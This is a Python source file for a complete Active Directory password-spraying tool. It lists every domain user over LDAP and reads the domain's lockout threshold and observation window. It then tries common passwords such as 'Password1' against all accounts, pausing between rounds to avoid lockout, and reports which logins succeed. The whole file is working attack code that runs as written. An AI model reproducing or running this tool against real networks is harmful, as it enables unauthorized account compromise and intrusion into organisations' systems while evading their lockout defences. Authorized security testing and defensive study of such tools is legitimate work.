#!/usr/bin/env python3
import argparse
import time
import sys
import math
import ssl
import datetime
from ldap3 import Server, Connection, ALL, SUBTREE, Tls, NTLM, BASE

def ms_to_time_str(ms):
    """Converts milliseconds to a human-readable HH:MM:SS string."""
    total_seconds = int(ms / 1000)
    hours = total_seconds // 3600
    minutes = (total_seconds % 3600) // 60
    seconds = total_seconds % 60
    return f"{hours}h {minutes}m {seconds}s"

def build_search_base(domain):
    """Builds an LDAP search base from a domain string, e.g. BLAH.local -> DC=BLAH,DC=local"""
    parts = domain.split('.')
    return ",".join(f"DC={part}" for part in parts)

def query_ad_users(dc_ip, ad_username, ad_password, ad_domain, use_ldaps=True):
    # Set up TLS for LDAPS with certificate validation disabled
    tls_config = Tls(validate=ssl.CERT_NONE)
    port = 636 if use_ldaps else 389
    server = Server(dc_ip, port=port, use_ssl=use_ldaps, get_info=ALL, tls=tls_config, connect_timeout=10)
    
    # Create a connection with explicit NTLM authentication, manual bind, and disable referral chasing
    conn = Connection(server, user=ad_username, password=ad_password,
                      authentication=NTLM, auto_bind=False, auto_referrals=False)
    if not conn.bind():
        print(f"[ERROR] Unable to bind to AD: {conn.result}", flush=True)
        sys.exit(1)
    
    # Build search base using the provided domain.
    search_base = build_search_base(ad_domain)
    search_filter = '(&(objectClass=user)(objectCategory=person))'
    attributes = ['sAMAccountName']
    
    if not conn.search(search_base, search_filter, SUBTREE, attributes=attributes):
        print("[ERROR] AD query failed.", flush=True)
        conn.unbind()
        sys.exit(1)
    
    users = []
    for entry in conn.entries:
        if hasattr(entry, 'sAMAccountName'):
            users.append(str(entry.sAMAccountName))
    
    conn.unbind()
    return users

def query_lockout_policy(dc_ip, ad_username, ad_password, use_ldaps=True):
    """
    Queries AD for the lockout policy attributes:
      - lockoutObservationWindow: the duration within which failed attempts are observed.
      - lockoutThreshold: the number of failed attempts allowed before lockout.
    
    Returns:
      (lockout_window_ms, lockout_threshold)
      lockout_window_ms is converted to milliseconds.
    """
    tls_config = Tls(validate=ssl.CERT_NONE)
    port = 636 if use_ldaps else 389
    # Set get_info=ALL so that the server.info contains the rootDSE attributes.
    server = Server(dc_ip, port=port, use_ssl=use_ldaps, tls=tls_config, connect_timeout=10, get_info=ALL)
    
    conn = Connection(server, user=ad_username, password=ad_password,
                      authentication=NTLM, auto_bind=False, auto_referrals=False)
    if not conn.bind():
        print(f"[ERROR] Unable to bind to AD for policy query: {conn.result}", flush=True)
        return None, None

    # Retrieve the default naming context directly from the server info
    default_naming_context = server.info.other.get('defaultNamingContext', [None])[0]
    if not default_naming_context:
        print("[ERROR] Could not retrieve default naming context from server info", flush=True)
        conn.unbind()
        return None, None

    # Query the domain object for the lockout policy attributes.
    conn.search(default_naming_context, '(objectCategory=domain)', attributes=['lockoutObservationWindow', 'lockoutThreshold'])
    lockout_window_ms = None
    lockout_threshold = None
    if conn.entries:
        entry = conn.entries[0]
        if 'lockoutObservationWindow' in entry:
            value = entry.lockoutObservationWindow.value
            try:
                # If the value is a timedelta, convert using total_seconds; otherwise assume numeric (in 100-ns intervals).
                if isinstance(value, datetime.timedelta):
                    lockout_window_ms = int(value.total_seconds() * 1000)
                else:
                    lockout_window_ms = abs(int(value)) // 10000
                print(f"[INFO] Retrieved lockout observation window from AD: {lockout_window_ms} ms", flush=True)
            except Exception as e:
                print(f"[ERROR] Failed to convert lockout observation window value: {e}", flush=True)
        else:
            print("[WARNING] lockoutObservationWindow attribute not found.", flush=True)

        if 'lockoutThreshold' in entry:
            try:
                lockout_threshold = int(entry.lockoutThreshold.value)
                print(f"[INFO] Retrieved lockout threshold from AD: {lockout_threshold} failed attempts", flush=True)
            except Exception as e:
                print(f"[ERROR] Failed to retrieve lockout threshold: {e}", flush=True)
        else:
            print("[WARNING] lockoutThreshold attribute not found.", flush=True)
    else:
        print("[WARNING] Could not retrieve lockout policy from AD", flush=True)
    
    conn.unbind()
    return lockout_window_ms, lockout_threshold

def attempt_login(dc_ip, username, password, domain, use_ldaps=True):
    """
    For a given username (typically the SAMAccountName) and password, this function
    constructs a full NTLM username (if needed) and attempts a bind.
    """
    # Prepend the domain if not already included.
    if "\\" not in username:
        full_username = f"{domain.upper()}\\{username}"
    else:
        full_username = username

    tls_config = Tls(validate=ssl.CERT_NONE)
    port = 636 if use_ldaps else 389
    server = Server(dc_ip, port=port, use_ssl=use_ldaps, tls=tls_config, connect_timeout=10)
    conn = Connection(server, user=full_username, password=password,
                      authentication=NTLM, auto_bind=False, auto_referrals=False)
    if conn.bind():
        conn.unbind()
        return "SUCCESS"
    else:
        error_msg = str(conn.result)
        if "locked" in error_msg.lower():
            return "LOCKED_OUT"
        else:
            return "FAILURE"

def spray_passwords(dc_ip, users, passwords, pw_quantity, per_request_delay_ms, round_delay_ms, domain, use_ldaps=True):
    """
    For each spray round (of pw_quantity passwords), try each password against all users.
    A per-request delay is applied after each attempt.
    After each round (except the last), the tool waits for the lockout time window before continuing.
    """
    num_rounds = math.ceil(len(passwords) / pw_quantity)
    for i in range(num_rounds):
        start_index = i * pw_quantity
        end_index = start_index + pw_quantity
        current_passwords = passwords[start_index:end_index]
        print(f"\n[INFO] Spray Round {i+1}: Trying passwords {start_index+1} to {min(end_index, len(passwords))}", flush=True)
        for pwd in current_passwords:
            for user in users:
                result = attempt_login(dc_ip, user, pwd, domain, use_ldaps=use_ldaps)
                print(f"[{result}] User: {user} | Password: {pwd}", flush=True)
                time.sleep(per_request_delay_ms / 1000.0)
        if i < num_rounds - 1:
            print(f"[INFO] Completed round {i+1}. Waiting for lockout observation window: {round_delay_ms/1000.0:.0f} seconds before next round...\n", flush=True)
            time.sleep(round_delay_ms / 1000.0)

def main():
    parser = argparse.ArgumentParser(description="AD Password Spraying Tool")
    parser.add_argument("--dc-ip", required=True, help="IP address of the Domain Controller")
    parser.add_argument("--ad-domain", required=True, help="AD domain (e.g., ANC.local)")
    parser.add_argument("--ad-user", required=True, help="AD username for querying the user list (e.g., jonadmin). Domain will be prepended if not provided.")
    parser.add_argument("--ad-pass", required=True, help="AD password for querying the user list")
    parser.add_argument("--passwords", help="Optional file path to the passwords list (passwords.txt). If not provided, default passwords will be used.")
    parser.add_argument("--users", help="Optional file path for user list (if not auto-retrieved)")
    parser.add_argument("--pw-quantity", type=int, default=1, help="Number of passwords to try per spray round")
    parser.add_argument("--rate-limit", type=int, default=1000, help="Delay (in milliseconds) between each individual request")
    args = parser.parse_args()

    # Build NTLM username for AD queries.
    if "\\" not in args.ad_user:
        ntlm_username = f"{args.ad_domain.upper()}\\{args.ad_user}"
    else:
        ntlm_username = args.ad_user

    # Retrieve or load the user list.
    if args.users:
        try:
            with open(args.users, "r") as f:
                users = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[ERROR] Failed to read user file: {e}", flush=True)
            sys.exit(1)
    else:
        users = query_ad_users(args.dc_ip, ntlm_username, args.ad_pass, args.ad_domain, use_ldaps=True)
        try:
            with open("retrieved_users.txt", "w") as f:
                for user in users:
                    f.write(user + "\n")
            print(f"[INFO] Retrieved {len(users)} users from AD and saved to retrieved_users.txt", flush=True)
        except Exception as e:
            print(f"[WARNING] Could not save retrieved users to file: {e}", flush=True)

    # Load the passwords list, or use default if not provided.
    if args.passwords:
        try:
            with open(args.passwords, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[ERROR] Failed to read passwords file: {e}", flush=True)
            sys.exit(1)
    else:
        passwords = ["Password1", "Password1!", "Welcome1"]
        print("[INFO] No passwords file provided; using default password list.", flush=True)

    # Query AD for the lockout policy: observation window and threshold.
    lockout_time_window_ms, lockout_threshold = query_lockout_policy(args.dc_ip, ntlm_username, args.ad_pass, use_ldaps=True)
    if lockout_time_window_ms is None:
        lockout_time_window_ms = 30 * 60 * 1000
        print(f"[INFO] Using fallback lockout observation window: {lockout_time_window_ms} ms", flush=True)
    if lockout_threshold is None:
        lockout_threshold = 5
        print(f"[INFO] Using fallback lockout threshold: {lockout_threshold} failed attempts", flush=True)
    
    total_users = len(users)
    total_passwords = len(passwords)
    num_rounds = math.ceil(total_passwords / args.pw_quantity)
    total_attempts = total_users * total_passwords
    total_attempt_delay_ms = total_attempts * args.rate_limit
    total_round_wait_ms = (num_rounds - 1) * lockout_time_window_ms if num_rounds > 1 else 0
    estimated_total_time_ms = total_attempt_delay_ms + total_round_wait_ms

    print("\n==================== SPRAY SUMMARY ====================", flush=True)
    print(f"Accounts to spray         : {total_users}", flush=True)
    print(f"Passwords to try          : {total_passwords}", flush=True)
    print(f"Spray rounds (each with {args.pw_quantity} password(s)) : {num_rounds}", flush=True)
    print(f"Lockout Observation Window: {lockout_time_window_ms} ms ({ms_to_time_str(lockout_time_window_ms)})", flush=True)
    print(f"Lockout Threshold         : {lockout_threshold} failed attempts", flush=True)
    print(f"Per-request delay         : {args.rate_limit} ms", flush=True)
    print(f"Total login attempts      : {total_attempts}", flush=True)
    print(f"Estimated total time      : {estimated_total_time_ms} ms ({ms_to_time_str(estimated_total_time_ms)})", flush=True)
    print("=======================================================\n", flush=True)
    
    proceed = input("Proceed with the spray? (Y/n): ")
    if proceed.lower() not in ["y", "yes", ""]:
        print("[INFO] Aborting as per user request.", flush=True)
        sys.exit(0)
    
    spray_passwords(args.dc_ip, users, passwords, args.pw_quantity, args.rate_limit, lockout_time_window_ms, args.ad_domain, use_ldaps=True)

if __name__ == "__main__":
    main()
